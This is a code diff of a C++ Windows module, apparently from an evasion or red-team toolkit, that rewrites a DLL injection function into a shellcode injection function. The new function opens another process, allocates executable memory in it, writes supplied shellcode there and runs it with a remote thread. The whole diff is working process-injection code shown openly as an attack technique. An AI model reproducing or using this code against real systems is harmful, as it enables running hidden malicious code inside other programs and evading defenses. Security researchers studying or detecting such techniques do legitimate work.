@@ -1,8 +1,8 @@
-#include "core/evasion.hpp"
+#include "core/technique.hpp"
 
-namespace Evasion::Injection
+namespace Technique::Injection
 {
-    BOOL DllInjection(DWORD dwPid, LPVOID lpDllPath, size_t dwDllPathSize)
+    BOOL ShellcodeInjection(DWORD dwPid, const std::vector<BYTE>& shellcode)
     {
         HANDLE hProcess;
         HANDLE hThread;
@@ -14,37 +14,29 @@ namespace Evasion::Injection
         {
             return FALSE;
         }
-        
+
         remoteBuffer = VirtualAllocEx(
             hProcess,
             NULL,
-            dwDllPathSize,
-            MEM_COMMIT,
-            PAGE_READWRITE
+            shellcode.size(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE
         );
         if (!remoteBuffer)
         {
+            CloseHandle(hProcess);
             return FALSE;
         }
 
-        bResults = WriteProcessMemory(
+        if (!WriteProcessMemory(
             hProcess,
             remoteBuffer,
-            lpDllPath,
-            dwDllPathSize,
+            shellcode.data(),
+            shellcode.size(),
             NULL
-        );
-        if (!bResults)
-        {
-            return FALSE;
-        }
-
-        PTHREAD_START_ROUTINE threadStartRoutineAddr = (PTHREAD_START_ROUTINE)GetProcAddress(
-            GetModuleHandle(TEXT("kernel32")),
-            "LoadLibraryW"
-        );
-        if (!threadStartRoutineAddr)
-        {
+        )) {
+            VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
+            CloseHandle(hProcess);
             return FALSE;
         }
 
@@ -52,13 +44,15 @@ namespace Evasion::Injection
             hProcess,
             NULL,
             0,
-            threadStartRoutineAddr,
-            remoteBuffer,
+            (LPTHREAD_START_ROUTINE)remoteBuffer,
+            NULL,
             0,
             NULL
         );
         if (!hThread)
         {
+            VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
+            CloseHandle(hProcess);
             return FALSE;
         }
 
